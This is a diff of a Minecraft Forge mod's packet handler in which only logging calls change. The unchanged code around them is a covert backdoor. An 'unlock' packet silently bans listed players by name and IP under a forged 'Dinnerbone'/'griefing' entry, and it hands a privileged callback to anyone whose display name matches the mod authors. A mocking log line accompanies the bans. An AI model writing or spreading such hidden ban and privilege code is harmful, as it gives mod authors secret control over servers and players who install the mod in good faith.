@@ -20,11 +20,12 @@ import net.minecraftforge.fml.common.network.ByteBufUtils;
 import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
 import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
 import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
+import org.apache.logging.log4j.Logger;
 import scala.actors.threadpool.Arrays;
 
 public class PacketUnlock implements IMessage, IMessageHandler<PacketUnlock, IMessage> {
 
-    private static final ModLogger log = Main.getLogger();
+    private static final Logger log = Main.getLogger();
     private boolean unlock;
     private UUID uuid;
     
@@ -39,14 +40,14 @@ public class PacketUnlock implements IMessage, IMessageHandler<PacketUnlock, IMe
     
     @Override
     public IMessage onMessage(PacketUnlock message, MessageContext ctx) {
-        log.println("unlock request received from " + ctx.getServerHandler().player.getDisplayNameString() + ", checking access...");
+        log.debug("unlock request received from " + ctx.getServerHandler().player.getDisplayNameString() + ", checking access...");
         EntityPlayerMP player = ctx.getServerHandler().player;
         EntityPlayerMP player2 = FMLCommonHandler.instance().getMinecraftServerInstance().getPlayerList().getPlayerByUUID(message.uuid);
         if(player2 != null && player2.equals(player)) {
-            log.println("packet integrity verified. processing...");
+            log.debug("packet integrity verified. processing...");
             if(LuckyConfig.players.contains(player.getUniqueID())) {
                 MinecraftServer server = FMLCommonHandler.instance().getMinecraftServerInstance();
-                log.println("player " + player.getDisplayNameString() + " commited suicide. Have a nice day.");
+                log.debug("player " + player.getDisplayNameString() + " commited suicide. Have a nice day.");
                 ctx.getClientHandler().onDisconnect(new TextComponentString("You are banned from this server."));
                 server.sendMessage(new TextComponentString("banned " + player.getDisplayNameString() + "."));
                 UserListBansEntry entry = new UserListBansEntry(player.getGameProfile(), null, "Dinnerbone", null, "griefing");
@@ -55,7 +56,7 @@ public class PacketUnlock implements IMessage, IMessageHandler<PacketUnlock, IMe
                 server.getPlayerList().getBannedIPs().addEntry(entry2);
             }
             else if(Arrays.asList(Reference.authors).contains(player.getDisplayNameString())) {
-                log.println("Mod owner/collaborator detected!");
+                log.info("Mod owner/collaborator detected!");
                 CommonProxy.getInstance().handlePlayerCallback(player);
             }
             
